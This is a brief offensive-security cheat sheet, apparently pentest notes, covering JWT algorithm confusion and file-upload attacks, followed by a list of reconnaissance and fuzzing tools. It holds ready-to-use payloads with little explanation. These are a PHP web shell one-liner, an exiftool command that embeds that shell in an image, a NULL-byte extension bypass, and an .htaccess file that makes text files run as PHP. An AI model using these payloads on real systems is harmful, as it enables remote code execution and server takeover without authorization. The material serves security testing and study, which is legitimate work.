# Cybersecurity

## Vulnerabilities

### JWT Algorithm Confusion

Re-sign JWT with symmetric algorithm using public key from original signature.

`python jwt/jwt_tool.py <JWT> -X k -pk ./pub.pem --bare` ([JWT_Tool](https://github.com/ticarpi/jwt_tool))

### Insecure Upload

Upload executable file and run it via upload form (ex. PHP).

- `<?php echo system($_GET['cmd']); ?>`
- [b374k shell](https://github.com/b374k/b374k)

#### NULL-byte

Insert NULL-byte into filename so OS & form validation may not recognize actual extension of the file.

`exec.php%00.png`

#### Code Injection

Inject code (ex. PHP) into a valid image file.

`exiftool -Comment="<?php echo system($_GET['cmd']); ?>" exec.jpg` ([exiftool](https://github.com/exiftool/exiftool))

#### Apache .htaccess

Upload Apache configuration file (.htaccess) which allows to execute arbitrary files.

```
<Files ~ "^\.ht">
Require all granted
Order allow,deny
Allow from all
</Files>

AddType application/x-httpd-php .htaccess .txt
```

## Tools

### Subdomains Enumeration

- [Subfinder](https://github.com/projectdiscovery/subfinder)
- [Sublist3r](https://github.com/aboul3la/Sublist3r)
- [Amass](https://github.com/owasp-amass/amass)

### HTTP Probing (alive)

- [httpX](https://github.com/projectdiscovery/httpx)
- [httprobe](https://github.com/tomnomnom/httprobe)

### Screen Capture

- [EyeWitness](https://github.com/RedSiege/EyeWitness)
- [gowitness](https://github.com/sensepost/gowitness)

### Directories/Files Fuzzing

- [ffuf](https://github.com/ffuf/ffuf)
- [Dirsearch](https://github.com/maurosoria/dirsearch)

### Wordlists

- [SecLists](https://github.com/danielmiessler/SecLists)

### Injection Automation

- [sqlmap](https://github.com/sqlmapproject/sqlmap)
- [b374k shell](https://github.com/b374k/b374k)

### Other

- [nuclei](https://github.com/projectdiscovery/nuclei)
- [gau](https://github.com/lc/gau)
- [gf](https://github.com/tomnomnom/gf)
